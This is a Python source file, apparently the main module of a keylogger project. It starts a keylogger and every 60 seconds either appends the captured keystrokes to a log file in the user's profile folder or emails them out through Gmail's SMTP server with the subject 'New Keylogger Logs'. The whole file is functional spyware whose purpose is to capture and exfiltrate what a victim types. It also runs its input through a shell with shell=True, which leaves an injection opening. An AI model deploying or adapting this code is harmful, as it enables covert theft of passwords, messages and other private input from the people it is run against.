import os
import smtplib
import subprocess
import sys
import time

# append path, needed for all 'main' files
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))

from src.keylogger import Keylogger


def get_env_var(var):
    command = subprocess.Popen(f"echo {var}", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE, shell=True)
    return ((command.stdout.read()).decode("utf-8").splitlines()[0]).replace("\\", "/")


def save_text_locally(text, file_path):
    try:
        if not os.path.exists(file_path):
            file = open(file_path, "w", encoding="utf-8")
            file.write("-" * 10 + "{0} {1}".format(time.strftime("%d/%m/%Y"), time.strftime("%I:%M:%S")) + "-" * 10 + "\n")
        else:
            file = open(file_path, "a", encoding="utf-8")
    except IOError:
        return False

    file.write("")
    file.write(text)
    file.close()

    return True


def send_gmail(text, email, password):
    email_content = "Subject: {}\n\n{}".format(f"New Keylogger Logs", text)

    try:
        smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        smtp_server.ehlo()  # identifies you to the smtp server
        smtp_server.login(email, password)
        smtp_server.sendmail(email, email, email_content)
        smtp_server.close()
        return True
    except smtplib.SMTPResponseException:
        return False


class Main:
    def __init__(self, timer, export_path="", gmail="", gmail_pass=""):
        self.gmail = gmail
        self.gmail_pass = gmail_pass
        self.keylogger = Keylogger()
        self.timer = timer
        self.export_path = get_env_var(export_path)

    def start(self):
        self.keylogger.start()

        while True:
            time.sleep(self.timer)

            if not self.keylogger.keylogger_running:
                break

            key_log = self.keylogger.get_key_log()

            if key_log != "":
                if self.gmail == "":
                    if save_text_locally(key_log, self.export_path):
                        self.keylogger.clear_key_log()
                else:
                    if send_gmail(key_log, self.gmail, self.gmail_pass):
                        self.keylogger.clear_key_log()


if __name__ == "__main__":
    Main(60, "%userprofile%\log.txt").start()